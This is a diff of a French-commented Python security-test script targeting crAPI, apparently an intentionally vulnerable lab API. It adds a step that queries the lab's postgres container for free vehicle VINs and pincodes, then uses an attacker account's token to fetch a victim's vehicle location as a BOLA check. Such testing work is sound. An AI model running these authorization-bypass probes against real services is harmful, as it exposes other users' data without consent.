@@ -163,28 +163,43 @@ def main():
 
     atk, vic = tokens  # atk = foulen, vic = foulana
 
-    def ensure_vehicles(token, vin, pin="789456"):
-        """Ajoute un vehicule si le compte nen a pas (BOLA necessite 2 vehicules)."""
+    import subprocess
+    def free_vins(n=2):
+        """Decouvre les vehicules non attribues (seed crAPI) via la base locale."""
+        try:
+            out = subprocess.run(
+                ["docker", "exec", "postgresdb", "psql", "-U", "admin", "-d", "crapi", "-tAc",
+                 "SELECT vin || '|' || pincode FROM vehicle_details WHERE owner_id IS NULL LIMIT %d" % n],
+                capture_output=True, text=True, timeout=15).stdout.strip()
+            return [x for x in out.splitlines() if x]
+        except Exception:
+            return []  # fallback: VIN/pincode fournis via --vin vin:pin
+
+    def ensure_vehicles(token, vin_pin=None):
+        """S assurer que le compte possede un vehicule (BOLA = 2 comptes, 2 vehicules)."""
         st, res = http("GET", f"{base}/identity/api/v2/vehicle/vehicles", token=token)
-        ids = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId")
-        if not ids:
+        ids = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId") or find_ids(res, "uuid")
+        if not ids and vin_pin:
+            vin, pin = vin_pin.split(":", 1)
             st, res = http("POST", f"{base}/identity/api/v2/vehicle/add_vehicle",
                            {"vin": vin, "pincode": pin}, token=token)
-            print(f"    add_vehicle {vin} -> HTTP {st}: {str(res)[:100]}")
+            print(f"    add_vehicle {vin} -> HTTP {st}: {str(res)[:110]}")
             st, res = http("GET", f"{base}/identity/api/v2/vehicle/vehicles", token=token)
-            ids = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId")
+            ids = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId") or find_ids(res, "uuid")
         return ids, res
 
-    # 2. Ressources (avec creation si besoin)
-    atk_vehicles, res = ensure_vehicles(atk, "1HGCM82633A004352")
-    vic_vehicles, res2 = ensure_vehicles(vic, "2HGGCM82633A004353")
+    # 2. Ressources : revendiquer un vehicule libre par compte (seed crAPI)
+    libres = free_vins(2)
+    print(f"  * VINs libres trouves: {libres}")
+    atk_vehicles, res = ensure_vehicles(atk, libres[0] if libres else None)
+    vic_vehicles, res2 = ensure_vehicles(vic, libres[1] if len(libres) > 1 else None)
     print(f"  * Vehicules: attaquant={atk_vehicles} victime={vic_vehicles}")
 
     findings = []
 
     # 3. BOLA : acces au vehicule/position de la victime avec le jeton attaquant
     if vic_vehicles:
-        vid = vic_vehicles[0]
+        vid = vic_vehicles[0]  # uuid du vehicule de la victime (foulana)
         findings.append(check(
             "BOLA-vehicle-location", "CWE-639", "A01:2025", "crapI",
             "/identity/api/v2/vehicle/" + str(vid) + "/location", "GET",
